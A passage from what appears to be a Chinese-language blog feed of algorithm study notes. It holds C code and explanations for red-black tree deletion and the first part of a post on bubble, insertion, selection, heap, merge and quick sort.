class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 连接v结点和u结点的父亲</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transplant</span><span class="params">(T u, T v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;fa == nil) rt = v;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;fa-&gt;lson) &#123;</span><br><span class="line">        u-&gt;fa-&gt;lson = v;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        u-&gt;fa-&gt;rson = v;</span><br><span class="line">    &#125;</span><br><span class="line">    v-&gt;fa = u-&gt;fa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    T cur = rt;</span><br><span class="line">    <span class="comment">// 获取值v对应的结点的指针</span></span><br><span class="line">    <span class="keyword">while</span> (cur != nil) &#123;</span><br><span class="line">        cur-&gt;siz--;</span><br><span class="line">        <span class="keyword">if</span> (v &lt; cur-&gt;v) cur = cur-&gt;lson;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v &gt; cur-&gt;v) cur = cur-&gt;rson;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cur-&gt;cnt--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 大于0直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (cur-&gt;cnt &gt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    T y = cur;</span><br><span class="line">    T x;</span><br><span class="line">    <span class="keyword">bool</span> originColor = y-&gt;color;</span><br><span class="line">    <span class="comment">// 左儿子或右儿子是空的，直接替换即可</span></span><br><span class="line">    <span class="keyword">if</span> (cur-&gt;lson == nil) &#123;</span><br><span class="line">        x = cur-&gt;rson;</span><br><span class="line">        transplant(cur, x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur-&gt;rson == nil) &#123;</span><br><span class="line">        x = cur-&gt;lson;</span><br><span class="line">        transplant(cur, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左右儿子都非空，我们需要用y的后继来替换当前结点</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获得当前结点cur的后继及其颜色</span></span><br><span class="line">        y = cur-&gt;rson;</span><br><span class="line">        <span class="keyword">while</span> (y-&gt;lson != nil) y = y-&gt;lson;</span><br><span class="line">        originColor = y-&gt;color;</span><br><span class="line">        <span class="comment">// y的右结点替换y</span></span><br><span class="line">        x = y-&gt;rson;</span><br><span class="line">        <span class="comment">// y如果是cur的子结点，那么x父亲应该指向y，注意到x也可以是NIL</span></span><br><span class="line">        <span class="comment">// 否则应该用x替换y，y替换cur</span></span><br><span class="line">        <span class="keyword">if</span> (y-&gt;fa == cur) &#123;</span><br><span class="line">            x-&gt;fa = y;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            transplant(y, x);</span><br><span class="line">            y-&gt;rson = cur-&gt;rson;</span><br><span class="line">            cur-&gt;rson-&gt;fa = y;</span><br><span class="line">        &#125;</span><br><span class="line">        transplant(cur, y);</span><br><span class="line">        y-&gt;lson = cur-&gt;lson;</span><br><span class="line">        y-&gt;lson-&gt;fa = y;</span><br><span class="line">        y-&gt;color = cur-&gt;color;</span><br><span class="line">        <span class="comment">// 从初始的y的位置到cur的位置上的所有结点的siz需要更新</span></span><br><span class="line">        T c = x;</span><br><span class="line">        <span class="keyword">while</span> (c != y) &#123;</span><br><span class="line">            c = c-&gt;fa;</span><br><span class="line">            c-&gt;up();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> cur;</span><br><span class="line">    <span class="keyword">if</span> (originColor == BLACK) remove_fixed(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　假设结点y的初始颜色是黑色，那么我们应该如何修复呢？我们可以这样考虑:结点y删除后，y的黑色由x来继承，这样x就相当于是一个具有双重颜色的结点”红黑或者黑黑”，这样，性质5就没有被破坏，但有可能破坏了性质1，2，和4。我们需要做的其实就是把其中的一重颜色去掉。<br>　　首先，如果x是红黑结点时，那么我们可以把它直接变成黑色结点。这种情况下所有性质都得到了维护。另外，如果x是根结点时，无论x是红黑结点或者是黑黑结点，我们都只需要直接把它变成黑色即可。因此，我们需要考虑的就是x是双黑结点且不是根节点的情况。类似的，我们假设当前结点是父亲的左儿子。这时，分四种情况讨论。<br><img src="/2019/10/04/data-structure5/rb-remove.PNG" alt="remove"><br>　　对于情况1，其兄弟结点是红色，这个时候我们可以将兄弟结点变成黑色，并把父亲结点变成红色，再对父亲结点进行左旋，这个时候，我们发现得到的新的树中，x的兄弟结点就变成了黑色，转化为情况2～4<br>　　对于情况2，其兄弟结点和兄弟结点的左右儿子都是黑色，那么我们可以把兄弟结点变成红色，并把x的父亲赋值给x，这样，我们就相当与将x的其中一重黑色移动到了它的父亲结点上。<br>　　对于情况3，兄弟结点是黑色，兄弟节点的右儿子是黑色，左儿子是红色。这个时候我们将兄弟结点变成红色，兄弟结点的左儿子变成黑色，并对兄弟结点进行右旋操作，转化为情况4<br>　　对于情况4，兄弟节点是黑色，且兄弟结点右儿子是红色，交换父亲结点和兄弟结点的颜色，并把兄弟节点的右儿子染成黑色，再将父亲结点进行左旋，这个时候我们就相当于把黑色转移到了父亲结点上，可以直接退出循环。<br>　　在这4中情况下，由于情况1会转为2~4，情况3会转为情况4，并且情况4可以直接完成旋转和染色，情况2每次迭代高度都会减少1，因此最后的复杂度为O(logn)。这样，<del>我们就完成了修复函数的一半</del><br>　　类似的，当前结点是父亲的右儿子时，操作完全一样，只要左儿子变成右儿子，左旋变成右旋对称地处理即可。代码见下方:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_fixed</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 到达根节点或者当前结点是红色时，退出循环</span></span><br><span class="line">    <span class="keyword">while</span> (x != rt &amp;&amp; x-&gt;color == BLACK) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == x-&gt;fa-&gt;lson) &#123;</span><br><span class="line">            T w = x-&gt;fa-&gt;rson;</span><br><span class="line">            <span class="comment">// 情况1</span></span><br><span class="line">            <span class="keyword">if</span> (w-&gt;color == RED) &#123;</span><br><span class="line">                w-&gt;color = BLACK;</span><br><span class="line">                x-&gt;fa-&gt;color = RED;</span><br><span class="line">                rotL(x-&gt;fa);</span><br><span class="line">                w = x-&gt;fa-&gt;rson;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况2</span></span><br><span class="line">            <span class="keyword">if</span> (w-&gt;lson-&gt;color == BLACK &amp;&amp; w-&gt;rson-&gt;color == BLACK) &#123;</span><br><span class="line">                w-&gt;color = RED;</span><br><span class="line">                x = x-&gt;fa;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况3</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (w-&gt;rson-&gt;color == BLACK) &#123;</span><br><span class="line">                w-&gt;lson-&gt;color = BLACK;</span><br><span class="line">                w-&gt;color = RED;</span><br><span class="line">                rotR(w);</span><br><span class="line">                w = x-&gt;fa-&gt;rson;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况4</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                w-&gt;color = x-&gt;fa-&gt;color;</span><br><span class="line">                x-&gt;fa-&gt;color = BLACK;</span><br><span class="line">                w-&gt;rson-&gt;color = BLACK;</span><br><span class="line">                rotL(x-&gt;fa);</span><br><span class="line">                <span class="comment">// 把x赋值为根节点，就可以直接退出循环</span></span><br><span class="line">                x = rt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 这里对称地处理即可</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 别忘了把根节点变成黑色</span></span><br><span class="line">    x-&gt;color = BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="other-operation"><a href="#other-operation" class="headerlink" title="other operation"></a>other operation</h3><p>　　为了完成题目，我们还需要实现rank,search,pre,next等函数，这里写法其实和普通的平衡树没有任何区别，不过这里还是简单提一下吧。具体的代码就不贴了。</p><ol><li>rank函数，查找某一个数字的排名。我们沿着树遍历，若当前节点的值大于我们要找的数字，说明这个数字在左边，往左子树走。若当前结点的值等于我们要找的数字，说明左子树上所有节点都小于我们要找的数字，因此返回累计值加上左子树的大小再+1。若当前结点的值小于我们要找的数字，则累计值应该加上当前结点的次数和左子树的大小，并且往右子树方向找。</li><li>search函数，查找排名为x的数字的值。如果左子树的大小大于当前要找的排名，往左找。如果左子树加上当前的结点的次数小于要找的排名，往右找，同时排名减去左子树和当前结点次数。否则说明排名为x的数字刚好就是当前结点对应的值</li><li>pre函数，查找前驱。我们知道，前驱比当前结点小，故应该在结点的左子树当中，且是左子树中最大的那个。因此，我们只要找左子树中最大的值即可。找最大值的话就只需要不断地试着往右儿子移动，当右儿子为空时，当前结点就是最大值</li><li>next函数，查找后继。同样的，我们只需要查找右子树中最小的值即可。只需要在右子树中不断往左儿子方向走，左儿子为空时即为后继。</li></ol><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　红黑树这一期到这里应该就结束了，这一期主要还是作为笔记，以加深自己的印象。红黑树整体来说应该不能算是很难的一种数据结构，但它的分类很多，很繁琐而且并不好记，因此给人一种望而生畏的感觉。红黑树最大的难点应该还是在插入和删除时对红黑树特性的维护那个部分，这个可能只能强行背一下了，似乎也没有什么更好的记忆办法。作为一名喜欢算法与数据结构的程序员，红黑树是不得不掌握的。</p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> Balanced Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sort Algorithm</title>
      <link href="/2019/09/27/sort-algorithm/"/>
      <url>/2019/09/27/sort-algorithm/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是算法导论系列的第一篇文章。该系列主要将记录自己在学习算法导论的过程中的一些笔记以及心得体会等。接下来的几个月内应该会陆陆续续地更新，可能打算做比较多期，希望能够继续坚持做下去吧。在这个系列中，代码方面将以类似于算法导论中的伪代码的形式记录(或者是C语言)，另外，该系列文章均假设读者对基础的数据结构有一定的了解(链表，栈，队列等)。<br>　　今天的第一期主题就是排序算法，作为应用最广泛的算法之一，排序算法在整个算法体系中有着举足轻重的作用。因此，现在就让我们一起来学习吧。下文排序均默认按照从小到大的顺序。</p><h2 id="normal-sort-algorithm"><a href="#normal-sort-algorithm" class="headerlink" title="normal sort algorithm"></a>normal sort algorithm</h2><p>　　以下几种算法是最基础的排序算法，思路较为简单，实现起来比较容易，但是复杂度均为$$O(n^2)$$<br>　　当然，常数比较小，在小数据的情形下和其他算法花费的时间还是比较接近的。</p><h3 id="bubble-sort"><a href="#bubble-sort" class="headerlink" title="bubble sort"></a>bubble sort</h3><p>　　提到排序算法，我们最容易想到的也许就是冒泡排序了。如同它的名字一样，冒泡排序的做法就是用“冒泡”的形式不断将较小的数字提升到前面来。我们可以通过以下的排序方式实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = len<span class="number">-1</span>; j &gt; i; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &lt; a[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                swap(a[j],a[j<span class="number">-1</span>]);</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　思路很简单，我们也很容易能够看出，冒泡排序的复杂度是O(x^2)，然而，冒泡排序存在几个问题：</p><ol><li>有时候数组已经有序了，但是冒泡排序还是会继续进行循环，导致效率降低，上面我们采用了一个标记，当数组已经有序时，循环退出</li><li>当数组是逆序存储时，冒泡排序需要进行很多次的交换，导致效率降低，事实上我们会发现，一个数字从底部冒泡一次一格移动到顶部是很浪费时间的，因此就有了一种优化的办法：双向冒泡排序，这种优化算法能一定程度上降低常数</li></ol><p>　　另外，冒泡排序还有一个很重要的作用就是，它可以用来计算逆序对(j&gt;i 但是 a[j]&lt;a[i])的个数，注意到当我们交换两个数字时，整个数组的逆序对的数量就减少了1，因此我们只要统计数组的交换次数，就可以计算总逆序对的数量了。</p><h3 id="insert-sort"><a href="#insert-sort" class="headerlink" title="insert sort"></a>insert sort</h3><p>　　插入排序也是一种很经典的排序算法。具体就是一开始建立一个空数组，每次我们往其中插入一个数字，并维护数组的有序性，最后得到的就是一个有序的数组了。具体做法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &lt; a[j<span class="number">-1</span>]) swap(a+j,a+j<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="select-sort"><a href="#select-sort" class="headerlink" title="select sort"></a>select sort</h3><p>　　选择排序同样是一种简单的排序算法，和插入排序类似，选择排序同样是逐步往数组中插入元素，但不同的是选择排序每次选择最大的那一个数字插入数组中，最后得到一个有序的数组，具体做法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> idx = i, _min = a[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &lt; _min) &#123;</span><br><span class="line">                _min = a[j];</span><br><span class="line">                idx = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(a[i],a[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="improved-sort-algorithm"><a href="#improved-sort-algorithm" class="headerlink" title="improved sort algorithm"></a>improved sort algorithm</h2><p>　　前面我们用到的集中算法都有着一个很大的问题：复杂度太高了，这样的复杂度对我们来说很难接受。人们发明了很多其他优秀的算法来进行排序，使得时间复杂度降低到O(nlogn)。以下就是几种最经典的优化算法。</p><h3 id="heap-sort"><a href="#heap-sort" class="headerlink" title="heap sort"></a>heap sort</h3><p>　　按照算法导论的顺序，第一个讲到的应该是堆排序。这种排序用到了二叉堆，其中，二叉堆支持以下操作：</p><ol><li>INSERT 把元素插入堆中，保证维护堆的特性，复杂度为O(logn)</li><li>REMOVE 移除堆顶元素，具体做法是将该元素交换到堆的尾部，然后重新调整堆即可。复杂度O(logn)</li></ol><p>　　有了这样的一个堆的结构，我们就可以逐步往数组中插入所有元素，然后再一个一个弹出，最后按照弹出的顺序，我们得到了一个有序的数组(这里数组的下标从1开始)。<br>　　具体的代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LSON(a) ((a)&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RSON(b) ((b)&lt;&lt;1|1)</span></span><br><span class="line"><span class="comment">// 这里只是为了方便而设置为全局变量，最恰当的做法应该是把这些函数封装为一个结构体</span></span><br><span class="line"><span class="keyword">int</span> heapSize = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxHeapify</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = LSON(i);</span><br><span class="line">    <span class="keyword">int</span> r = RSON(i);</span><br><span class="line">    <span class="keyword">int</span> largest = i;</span><br><span class="line">    <span class="keyword">if</span> (l &lt;= heapSize &amp;&amp; a[l] &gt; a[largest]) &#123;</span><br><span class="line">        largest = l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (r &lt;= heapSize &amp;&amp; a[r] &gt; a[largest]) &#123;</span><br><span class="line">        largest = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">        swap(a+largest, a+i);</span><br><span class="line">        maxHeapify(a, largest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildHeap</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = heapSize/<span class="number">2</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        maxHeapify(a, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;</span><br><span class="line">    buildHeap(a);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = heapSize; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line">        swap(a+i,a+<span class="number">1</span>);</span><br><span class="line">        heapSize--;</span><br><span class="line">        maxHeapify(a, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　我们会发现，堆排序的时间复杂度还是十分不错的，建树和排序的复杂度均为O(nlogn)，最后总体的复杂度还是O(nlogn)。比起前面的几种算法，这是一个很大的优化。另外，堆排序还能应用于实现优先队列。堆中的每个节点存放的是关键字以及一些卫星数据。我们依照关键字实现一个最大堆或者最小堆，每次需要的时候就直接弹出即可。</p><h3 id="merge-sort"><a href="#merge-sort" class="headerlink" title="merge sort"></a>merge sort</h3><p>　　和堆排序类似，归并排序也是一种十分优秀的排序算法，不过归并没有用到堆这样的一种数据结构，而是用到了分治的思想，同样是一种应用广泛的算法思想。<br>　　分治，即分而治之。对与一个长度为N的数组的排序问题，我们可以试着将这个问题规模变小。我们知道，一个问题规模越小，往往越有助于我们的求解。因此，我们不妨考虑下将一个这个数组分成两个大小为N/2的数组，如果我们拥有两个长度为N/2的有序数组，那么我们可以在O(n)的时间内将这两个数组合并为一个长为N的数组。依次递归下去，直到数组的长度变为O(1)，退出递归。这样，我们就得到了这个表达式：<br>$$T(n)=2*T(n/2)+O(n)$$<br>　　使用代入法或主方法，我们可以得到这个表达式的解为T(n)=O(nlogn)。<br>　　具体代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">int</span> c[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>*a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>, p1 = l, p2 = mid+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">        <span class="comment">// 每次获取两个子数组的队头中更大的那一个加入数组c</span></span><br><span class="line">        <span class="keyword">if</span> (p1 &gt; mid) &#123;</span><br><span class="line">            c[i] = a[p2];</span><br><span class="line">            p2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p2 &gt; r) &#123;</span><br><span class="line">            c[i] = a[p1];</span><br><span class="line">            p1++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[p1] &lt; a[p2]) &#123;</span><br><span class="line">                c[i] = a[p1];</span><br><span class="line">                p1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                c[i] = a[p2];</span><br><span class="line">                p2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">        a[i] = c[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>*a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    mergeSort(a, l, mid);</span><br><span class="line">    mergeSort(a, mid+<span class="number">1</span>, r);</span><br><span class="line">    merge(a,l,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="quick-sort"><a href="#quick-sort" class="headerlink" title="quick sort"></a>quick sort</h3><p>　　快速排序，对于刚刚了解排序的人来说是一个比较难的算法。其解决问题的思路并不是那么直接。因此，需要我们多花点时间在这上面。尽管快速排序在最坏情况下的复杂度达到了Θ(n^2)，但是期望复杂度却是Θ(nlogn)。更重要的是，它隐含的常数因子是很小的，在大多数情况下，其表现比堆排序，归并排序还要优秀一些。<br>　　和归并排序类似，快排也用到了分治的思想，但是其做法和归并差别很大。对于归并排序来说，我们选择的是将数组平均分成两个部分，通过将这两个部分分别排序后再进行合并，我们成功地把复杂度降低到了O(nlogn)。然而，快排的思路是从数组中选出一个数字，并且按照比该数字小或比该数字大，将数组分成了两个部分，并依次对这两个部分进行递归。最后我们就得到了一个有序的数组了。由于每一次递归我们都能保证左边任何数字都小于右边的任何数字，我们最终能保证得到的数组是有序的。<br>　　算法具体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = a[r];</span><br><span class="line">    <span class="keyword">int</span> i = l<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = l; j &lt; r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[j] &lt;= key) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(a+j,a+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">    swap(a+i,a+r);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = partition(a, l, r);</span><br><span class="line">        quickSort(a, l, mid<span class="number">-1</span>);</span><br><span class="line">        quickSort(a, mid+<span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span 